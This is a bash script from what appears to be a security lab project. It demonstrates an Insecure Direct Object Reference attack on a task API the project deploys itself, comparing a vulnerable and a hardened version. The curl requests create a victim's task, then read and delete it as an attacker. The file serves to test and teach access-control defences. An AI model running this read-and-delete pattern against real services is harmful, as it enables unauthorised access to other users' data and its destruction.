#!/usr/bin/env bash
#
# 03-idor.sh
# Attack 3: Insecure Direct Object Reference (IDOR)
#
# Demonstrates that any caller can read and delete a task belonging to
# another user, just by knowing its taskId. On the hardened version the
# same requests should be rejected with 403 Forbidden once the caller's
# userId does not match the task owner.
#
# Usage:
#   ./03-idor.sh [vulnerable|hardened]
#
# Optional environment variables:
#   VICTIM_TOKEN     Bearer token for the victim, used to create the
#                     task. Required on the hardened version, since
#                     even creating a task needs authentication.
#   ATTACKER_TOKEN    Bearer token for the attacker, used to read and
#                     delete the victim's task. Required on the
#                     hardened version to actually exercise the
#                     ownership check rather than just the auth layer.
#                     Generate both with src/hardened/generate_token.py,
#                     using two different userId values.

set -uo pipefail

VERSION="${1:-vulnerable}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
TF_DIR="${SCRIPT_DIR}/../../infra/terraform/${VERSION}"

if [ ! -d "$TF_DIR" ]; then
    echo "Error: Terraform directory not found: $TF_DIR"
    exit 1
fi

API=$(terraform -chdir="$TF_DIR" output -raw api_endpoint 2>/dev/null)

if [ -z "$API" ]; then
    echo "Error: could not read api_endpoint from Terraform output."
    echo "Make sure the '$VERSION' version has been deployed in $TF_DIR"
    exit 1
fi

VICTIM_HEADER=()
if [ -n "${VICTIM_TOKEN:-}" ]; then
    VICTIM_HEADER=(-H "Authorization: Bearer ${VICTIM_TOKEN}")
fi

AUTH_HEADER=()
if [ -n "${ATTACKER_TOKEN:-}" ]; then
    AUTH_HEADER=(-H "Authorization: Bearer ${ATTACKER_TOKEN}")
fi

echo "============================================================"
echo "Attack 3: IDOR"
echo "Target version : $VERSION"
echo "API endpoint   : $API"
echo "============================================================"
echo

echo "[1/3] Creating a task as the victim (userId=victim-001)..."
curl -s -X POST "$API/tasks" \
    "${VICTIM_HEADER[@]}" \
    -H "Content-Type: application/json" \
    -d '{"title":"Victim private task","userId":"victim-001","description":"Only victim-001 should access this"}' \
    -o /tmp/idor_victim.json
cat /tmp/idor_victim.json
echo
echo

if command -v jq >/dev/null 2>&1; then
    TASK_ID=$(jq -r '.task.taskId' /tmp/idor_victim.json)
else
    TASK_ID=$(grep -o '"taskId": *"[^"]*"' /tmp/idor_victim.json | head -1 | sed 's/.*"\([^"]*\)"$/\1/')
fi

if [ -z "$TASK_ID" ] || [ "$TASK_ID" = "null" ]; then
    echo "Could not extract taskId from the creation response, stopping here."
    echo "If you are testing the hardened version, set VICTIM_TOKEN to a"
    echo "valid JWT for userId=victim-001 (see src/hardened/generate_token.py)."
    exit 1
fi

echo "Victim task ID: $TASK_ID"
echo

echo "[2/3] Attacker reads the victim's task without proving ownership..."
READ_STATUS=$(curl -s -o /tmp/idor_read.json -w "%{http_code}" "${AUTH_HEADER[@]}" "$API/tasks/${TASK_ID}")
echo "HTTP status: $READ_STATUS"
cat /tmp/idor_read.json
echo
echo

echo "[3/3] Attacker deletes the victim's task without proving ownership..."
DELETE_STATUS=$(curl -s -o /tmp/idor_delete.json -w "%{http_code}" -X DELETE "${AUTH_HEADER[@]}" "$API/tasks/${TASK_ID}")
echo "HTTP status: $DELETE_STATUS"
cat /tmp/idor_delete.json
echo
echo

if [ "$READ_STATUS" = "200" ] && [ "$DELETE_STATUS" = "200" ]; then
    echo "RESULT: VULNERABLE"
    echo "The attacker read and deleted a task belonging to victim-001"
    echo "with no ownership check of any kind."
elif [ "$READ_STATUS" = "403" ] || [ "$DELETE_STATUS" = "403" ]; then
    echo "RESULT: BLOCKED"
    echo "The ownership check rejected at least one of the two attempts."
elif [ "$READ_STATUS" = "401" ] || [ "$DELETE_STATUS" = "401" ]; then
    echo "RESULT: INCONCLUSIVE"
    echo "The attacker was rejected by the Lambda Authorizer before the"
    echo "ownership check could even run. Set ATTACKER_TOKEN to a valid"
    echo "JWT for a different userId than victim-001 to actually test"
    echo "the ownership logic, not just the authentication layer."
else
    echo "RESULT: UNEXPECTED"
    echo "Read status: $READ_STATUS, Delete status: $DELETE_STATUS"
    echo "Review the responses above."
fi

